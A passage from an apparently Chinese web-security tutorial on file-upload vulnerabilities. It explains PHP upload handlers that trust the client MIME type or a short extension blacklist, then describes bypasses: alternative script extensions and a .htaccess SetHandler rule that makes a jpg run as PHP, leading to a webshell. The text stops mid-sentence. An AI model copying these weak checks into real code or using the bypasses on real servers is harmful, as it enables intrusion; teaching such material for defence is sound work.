class="line">这段PHP代码是一个文件上传处理脚本，主要功能是接收用户上传的文件，并根据文件类型（MIME类型）进行验证。如果文件类型符合要求（`image/jpeg`、`image/png`、`image/gif`），则将文件移动到指定的上传目录。以下是代码的详细解释，包括语法和逻辑。</span><br><span class="line"></span><br><span class="line"><span class="comment">### 代码结构</span></span><br><span class="line">```php</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// 初始化上传状态为false</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// 初始化错误消息为空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123; <span class="comment">// 检查是否提交了表单</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123; <span class="comment">// 检查上传目录是否存在</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// 获取临时文件路径</span></span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; <span class="comment">// 生成目标文件路径</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; <span class="comment">// 将临时文件移动到目标路径</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// 设置上传状态为true</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>; <span class="comment">// 设置错误消息</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>; <span class="comment">// 文件类型不符合要求，设置错误消息</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>; <span class="comment">// 上传目录不存在，设置错误消息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代码详细解释"><a href="#代码详细解释" class="headerlink" title="代码详细解释"></a>代码详细解释</h3><h4 id="1-初始化变量"><a href="#1-初始化变量" class="headerlink" title="1. 初始化变量"></a>1. 初始化变量</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// 初始化上传状态为false</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// 初始化错误消息为空</span></span><br></pre></td></tr></table></figure><ul><li><code>$is_upload</code>：布尔变量，用于标记文件是否上传成功。</li><li><code>$msg</code>：字符串变量，用于存储错误消息或提示信息。</li></ul><h4 id="2-检查表单是否提交"><a href="#2-检查表单是否提交" class="headerlink" title="2. 检查表单是否提交"></a>2. 检查表单是否提交</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>$_POST[&#39;submit&#39;]</code>：检查表单是否通过POST方法提交。<code>submit</code>是表单中提交按钮的名称。</li><li><code>isset()</code>：检查变量是否已设置且不为<code>null</code>。如果表单提交按钮被点击，<code>$_POST[&#39;submit&#39;]</code>会被设置。</li></ul><h4 id="3-检查上传目录是否存在"><a href="#3-检查上传目录是否存在" class="headerlink" title="3. 检查上传目录是否存在"></a>3. 检查上传目录是否存在</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>UPLOAD_PATH</code>：常量，表示文件上传的目标目录路径。</li><li><code>file_exists()</code>：检查指定路径的文件或目录是否存在。如果上传目录不存在，脚本会进入<code>else</code>分支。</li></ul><h4 id="4-检查文件类型是否符合要求"><a href="#4-检查文件类型是否符合要求" class="headerlink" title="&#x3D;&#x3D;4. 检查文件类型是否符合要求&#x3D;&#x3D;"></a>&#x3D;&#x3D;4. 检查文件类型是否符合要求&#x3D;&#x3D;</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;type&#39;]</code>：获取上传文件的MIME类型。</li><li>这里检查文件类型是否为<code>image/jpeg</code>、<code>image/png</code>或<code>image/gif</code>。只有当文件类型符合这些条件时，才会继续后续操作。</li><li><code>||</code>：逻辑“或”运算符，表示满足任意一个条件即可。</li></ul><h4 id="5-获取临时文件路径"><a href="#5-获取临时文件路径" class="headerlink" title="5. 获取临时文件路径"></a>5. 获取临时文件路径</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>：获取上传文件的临时存储路径。PHP会将上传的文件临时存储在服务器的某个目录中。</li></ul><h4 id="6-生成目标文件路径"><a href="#6-生成目标文件路径" class="headerlink" title="6. 生成目标文件路径"></a>6. 生成目标文件路径</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li><code>UPLOAD_PATH</code>：目标上传目录。</li><li><code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>：获取用户上传文件的原始文件名。</li><li><code>$img_path</code>：拼接生成最终的目标文件路径，格式为<code>UPLOAD_PATH/文件名</code>。</li></ul><h4 id="7-移动上传文件"><a href="#7-移动上传文件" class="headerlink" title="7. 移动上传文件"></a>7. 移动上传文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// 设置上传状态为true</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>; <span class="comment">// 设置错误消息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>move_uploaded_file($temp_file, $img_path)</code>：将临时文件从<code>$temp_file</code>移动到目标路径<code>$img_path</code>。<ul><li>如果移动成功，设置<code>$is_upload</code>为<code>true</code>，表示上传成功。</li><li>如果移动失败，设置错误消息为“上传出错！”。</li></ul></li></ul><h4 id="8-文件类型不符合要求"><a href="#8-文件类型不符合要求" class="headerlink" title="8. 文件类型不符合要求"></a>8. 文件类型不符合要求</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果文件类型不符合要求（即不是<code>image/jpeg</code>、<code>image/png</code>或<code>image/gif</code>），设置错误消息为“文件类型不正确，请重新上传！”。</li></ul><h4 id="9-上传目录不存在"><a href="#9-上传目录不存在" class="headerlink" title="9. 上传目录不存在"></a>9. 上传目录不存在</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果上传目录<code>UPLOAD_PATH</code>不存在，设置错误消息为“文件夹不存在，请手工创建！”。</li></ul><h2 id="2-5-5-绕过黑名单上传"><a href="#2-5-5-绕过黑名单上传" class="headerlink" title="2.5.5 绕过黑名单上传"></a>2.5.5 绕过黑名单上传</h2><h3 id="绕过黑名单上传的攻击"><a href="#绕过黑名单上传的攻击" class="headerlink" title="绕过黑名单上传的攻击"></a>绕过黑名单上传的攻击</h3><p>上传图片时，如果<strong>提示不允许 php、asp 这种信息提示，可判断为黑名单限制</strong>，上传黑名单以外的后缀名即可。</p><p>在 iis 里 asp 禁止上传了，可以上传 asa cer cdx 这些后缀，如在网站里允许.net 执行 可以上传 ashx 代替 aspx。如果网站可以执行这些脚本，通过上传后门即可获取 webshell。</p><p>在<strong>不同的中间件中有特殊的情况</strong>，&#x3D;&#x3D;如果在 apache 可以开启 application&#x2F;x-httpd-php&#x3D;&#x3D;</p><p>&#x3D;&#x3D;在 AddType application&#x2F;x-httpd-php .php .phtml .php3&#x3D;&#x3D;</p><p>后缀名为 phtml 、php3 均被解析成 php 有的 apache 版本默认就会开启。</p><p>上传目标中间件可支持的环境的语言脚本即可，如.phtml、php3。</p><h3 id="绕过黑名单上传的原理"><a href="#绕过黑名单上传的原理" class="headerlink" title="绕过黑名单上传的原理"></a>绕过黑名单上传的原理</h3><p>上传模块，有时候会写成黑名单限制，在上传文件的时获取后缀名，再把后缀名与程序中黑名单进行检测，如果后缀名在黑名单的列表内，文件将禁止文件上传。<br><strong>黑名单即禁止哪些进入；不用黑名单中的即可；</strong></p><h3 id="黑名单上传的代码分析"><a href="#黑名单上传的代码分析" class="headerlink" title="黑名单上传的代码分析"></a>黑名单上传的代码分析</h3><p>首先是检测 submit 是否有值，获取文件的后缀名，进行黑名单对比，后缀名不在黑名单内，允许上传。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``````</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这段PHP代码是一个文件上传处理脚本，主要用于接收用户上传的文件，并根据文件扩展名进行安全性检查。以下是代码的详细解释，包括语法和逻辑。</span><br><span class="line"></span><br><span class="line"><span class="comment">### 代码结构</span></span><br><span class="line">```php</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// 初始化上传状态为false</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// 初始化错误消息为空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123; <span class="comment">// 检查是否提交了表单</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123; <span class="comment">// 检查上传目录是否存在</span></span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>); <span class="comment">// 定义禁止上传的文件扩展名</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// 获取上传文件的原始文件名并去除首尾空格</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 删除文件名末尾的点（假设deldot是自定义函数）</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">// 获取文件扩展名</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 将扩展名转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// 去除字符串::$DATA（防止NTFS流攻击）</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 去除扩展名首尾的空格</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123; <span class="comment">// 检查扩展名是否在禁止列表中</span></span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// 获取临时文件路径</span></span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>; <span class="comment">// 生成目标文件路径</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123; <span class="comment">// 将临时文件移动到目标路径</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// 设置上传状态为true</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>; <span class="comment">// 上传失败，设置错误消息</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>; <span class="comment">// 扩展名在禁止列表中，设置错误消息</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>; <span class="comment">// 上传目录不存在，设置错误消息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代码详细解释-1"><a href="#代码详细解释-1" class="headerlink" title="代码详细解释"></a>代码详细解释</h3><h4 id="1-初始化变量-1"><a href="#1-初始化变量-1" class="headerlink" title="1. 初始化变量"></a>1. 初始化变量</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// 初始化上传状态为false</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// 初始化错误消息为空</span></span><br></pre></td></tr></table></figure><ul><li><code>$is_upload</code>：布尔变量，用于标记文件是否上传成功。</li><li><code>$msg</code>：用于存储错误消息或提示信息。</li></ul><h4 id="2-检查表单是否提交-1"><a href="#2-检查表单是否提交-1" class="headerlink" title="2. 检查表单是否提交"></a>2. 检查表单是否提交</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>$_POST[&#39;submit&#39;]</code>：检查表单是否通过POST方法提交。<code>submit</code>是表单中提交按钮的名称。</li><li><code>isset()</code>：检查变量是否已设置且不为<code>null</code>。</li></ul><h4 id="3-检查上传目录是否存在-1"><a href="#3-检查上传目录是否存在-1" class="headerlink" title="3. 检查上传目录是否存在"></a>3. 检查上传目录是否存在</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>UPLOAD_PATH</code>：常量，表示文件上传的目标目录路径。</li><li><code>file_exists()</code>：检查指定路径的文件或目录是否存在。</li></ul><h4 id="4-定义禁止上传的文件扩展名"><a href="#4-定义禁止上传的文件扩展名" class="headerlink" title="4. 定义禁止上传的文件扩展名"></a>4. 定义禁止上传的文件扩展名</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>定义一个数组，包含不允许上传的文件扩展名。</li></ul><h4 id="5-获取并处理上传文件的文件名"><a href="#5-获取并处理上传文件的文件名" class="headerlink" title="5. 获取并处理上传文件的文件名"></a>5. 获取并处理上传文件的文件名</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// 获取文件名并去除首尾空格</span></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 删除文件名末尾的点</span></span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>：获取用户上传文件的原始文件名。</li><li><code>trim()</code>：去除字符串首尾的空格。</li><li><code>deldot()</code>：自定义函数，用于删除文件名末尾的点（<code>.</code>）。可能是为了防止类似<code>test.php.</code>的文件名绕过扩展名检查。</li></ul><h4 id="6-提取文件扩展名"><a href="#6-提取文件扩展名" class="headerlink" title="6. 提取文件扩展名"></a>6. 提取文件扩展名</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">// 获取文件扩展名</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>); <span class="comment">// 去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 去除扩展名首尾的空格</span></span><br></pre></td></tr></table></figure><ul><li><code>strrchr($file_name, &#39;.&#39;)</code>：从文件名中提取最后一个<code>.</code>及其后面的内容，即文件扩展名。</li><li><code>strtolower()</code>：将扩展名转换为小写，确保后续比较不受大小写影响。</li><li><code>str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext)</code>：去除扩展名中的<code>::$DATA</code>字符串。这是为了防止NTFS流攻击，攻击者可能利用<code>test.php::$DATA</code>绕过扩展名检查。</li><li><code>trim()</code>：去除扩展名首尾的空格。</li></ul><h4 id="7-检查文件扩展名是否在禁止列表中"><a href="#7-检查文件扩展名是否在禁止列表中" class="headerlink" title="7. 检查文件扩展名是否在禁止列表中"></a>7. 检查文件扩展名是否在禁止列表中</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>in_array($file_ext, $deny_ext)</code>：检查文件扩展名是否在禁止列表<code>$deny_ext</code>中。</li><li>如果扩展名不在禁止列表中，继续后续操作；否则，设置错误消息并终止处理。</li></ul><h4 id="8-生成目标文件路径"><a href="#8-生成目标文件路径" class="headerlink" title="8. 生成目标文件路径"></a>8. 生成目标文件路径</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// 获取临时文件路径</span></span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>; <span class="comment">// 生成目标文件路径</span></span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>：获取上传文件的临时存储路径。</li><li><code>UPLOAD_PATH</code>：目标上传目录。</li><li><code>date(&quot;YmdHis&quot;)</code>：生成当前时间戳，格式为<code>YYYYMMDDHHMMSS</code>。</li><li><code>rand(1000,9999)</code>：生成一个随机数，范围为1000到9999。</li><li><code>$img_path</code>：拼接生成最终的目标文件路径，格式为<code>UPLOAD_PATH/YYYYMMDDHHMMSS随机数.扩展名</code>。</li></ul><h4 id="9-移动上传文件"><a href="#9-移动上传文件" class="headerlink" title="9. 移动上传文件"></a>9. 移动上传文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// 设置上传状态为true</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>; <span class="comment">// 设置错误消息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>move_uploaded_file($temp_file, $img_path)</code>：将临时文件从<code>$temp_file</code>移动到目标路径<code>$img_path</code>。</li><li>如果移动成功，设置<code>$is_upload</code>为<code>true</code>，表示上传成功；否则，设置错误消息为“上传出错！”。</li></ul><h4 id="10-处理扩展名在禁止列表中的情况"><a href="#10-处理扩展名在禁止列表中的情况" class="headerlink" title="10. 处理扩展名在禁止列表中的情况"></a>10. 处理扩展名在禁止列表中的情况</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果文件扩展名在禁止列表中，设置错误消息为“不允许上传.asp,.aspx,.php,.jsp后缀文件！”。</li></ul><h4 id="11-处理上传目录不存在的情况"><a href="#11-处理上传目录不存在的情况" class="headerlink" title="11. 处理上传目录不存在的情况"></a>11. 处理上传目录不存在的情况</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果上传目录<code>UPLOAD_PATH</code>不存在，设置错误消息为“文件夹不存在，请手工创建！”。</li></ul><h2 id="2-5-6-htaccess-重写解析绕过上传"><a href="#2-5-6-htaccess-重写解析绕过上传" class="headerlink" title="2.5.6 htaccess 重写解析绕过上传"></a>2.5.6 htaccess 重写解析绕过上传</h2><h3 id="htaccess-重写解析绕过方法"><a href="#htaccess-重写解析绕过方法" class="headerlink" title="htaccess 重写解析绕过方法"></a>htaccess 重写解析绕过方法</h3><p>上传.htaccess 到网站里.htaccess 内容是</p><p>&lt;FilesMatch “jpg”&gt;</p><p>SetHandler application&#x2F;x-httpd-php</p></FilesMatch><p>再上传恶意的 jpg 到.htaccess 相同目录里，访问图片即可获取执行脚本。</p><h3 id="htaccess-重写解析绕过原理"><a href="#htaccess-重写解析绕过原理" class="headerlink" title="htaccess 重写解析绕过原理"></a>htaccess 重写解析绕过原理</h3><p>上传模块，黑名单过滤了所有的能执行的后缀名,如果允许上传.htaccess。htaccess 文件的作用是 可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP 地址的用户、只允许特定 IP 地址的用户、禁止目录列表，以及使用其他文件作为 index 文件等一些功能。</p><p>在 htaccess 里写入 SetHandler application&#x2F;x-httpd-php 则可以文件重写成 php 文件。&#x3D;&#x3D;要 htaccess 